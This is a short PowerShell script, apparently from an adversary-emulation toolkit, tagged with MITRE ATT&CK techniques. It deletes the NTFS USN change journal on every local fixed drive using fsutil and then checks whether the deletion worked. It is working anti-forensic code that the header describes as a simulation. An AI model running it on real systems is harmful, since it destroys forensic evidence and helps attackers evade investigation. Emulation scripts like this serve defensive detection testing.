<#
    T1070.004 - Indicator Removal: File Deletion
    T1562.001 - Impair Defenses: Disable or Modify Tools
    T1562.002 - Disable Windows Event Logging
    Delete USNJrnl for all local drives with fsutil.exe (Anti forensic script)
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

try{
    $Drives = Get-WMIObject Win32_LogicalDisk | Select-Object -Property DriveType, DeviceID
    foreach($Drive in $Drives)
    {   
        if($Drive.DriveType -eq 3){
            &"fsutil.exe" usn deletejournal /D $Drive.DeviceID
            $USNcontent = &"fsutil.exe" usn readJournal $Drive.DeviceID
            if($USNcontent.Count -lt 10){
                Write-Host -ForegroundColor Green "Success: USNJrnl Deleted for" $Drive.DeviceID
            }
            else{
                Write-Host -ForegroundColor Yellow "Warning: There is still some data in USNJrnl that coul be erased, content of USNJrnl for" $Drive.DeviceID "`n $USNcontent "
            }
        }
    }
}
catch{
    Write-Host -ForegroundColor Red "`nError: $_"
}

Stop-Transcript
